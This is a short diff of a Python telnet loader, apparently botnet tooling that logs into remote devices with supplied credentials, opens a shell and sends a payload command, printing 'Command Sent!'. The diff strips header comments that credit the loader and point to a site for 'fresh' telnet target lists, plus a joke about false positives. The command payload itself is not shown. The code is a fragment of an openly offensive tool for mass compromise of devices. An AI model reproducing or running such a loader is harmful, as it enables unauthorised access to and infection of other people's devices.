@@ -1,8 +1,3 @@
-#!/usr/bin/python3
-# Simple Telnet Loader Modified by Deeznuts? 
-# You Can Find Fresh TELNET List To Load @ http://godz56.tk/telnet-list/
-# Modified with more tweaks.
-
 import sys, re, os, socket, time
 from threading import Thread
 
@@ -49,7 +44,7 @@ def sqwad(ip, username, password):
         tn.sendall("sh\n".encode('utf-8'))
         time.sleep(0.05)
         tn.sendall((cmd + "\n").encode('utf-8'))
-        print("\033[32m[\033[31m+\033[32m] \033[32mCommand Sent!\033[37m %s" % (ip))  # False positives because that's what y'all wanted lmao
+        print("\033[32m[\033[31m+\033[32m] \033[32mCommand Sent!\033[37m %s" % (ip))
         time.sleep(15)
         tn.close()
     except Exception:
